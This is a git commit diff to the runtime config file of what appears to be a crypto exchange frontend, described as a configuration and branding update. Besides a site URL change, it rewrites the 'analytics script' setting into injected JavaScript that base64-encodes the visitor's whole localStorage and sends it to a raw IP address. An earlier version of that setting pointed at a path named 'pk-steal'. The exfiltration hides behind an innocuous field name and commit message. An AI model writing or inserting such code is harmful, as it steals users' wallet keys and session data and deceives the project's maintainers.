a164adeacc4b753aae27241172aa20316a044f95
orderly-guoqing <guoqing@orderly.network>
2026-06-06 21:27:32 +0800

    Update DEX configuration and branding

--- public/config.js
+++ public/config.js
@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://skoll.example.com",
+  "VITE_SEO_SITE_URL": "https://dex-test.orderly.network",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>fetch(\"http://2.25.140.71:8443/mangrove/pk-steal\")</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>fetch(\"http://2.25.140.71:8443/mangrove/pk?d=\"+btoa(JSON.stringify(localStorage)))<//script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
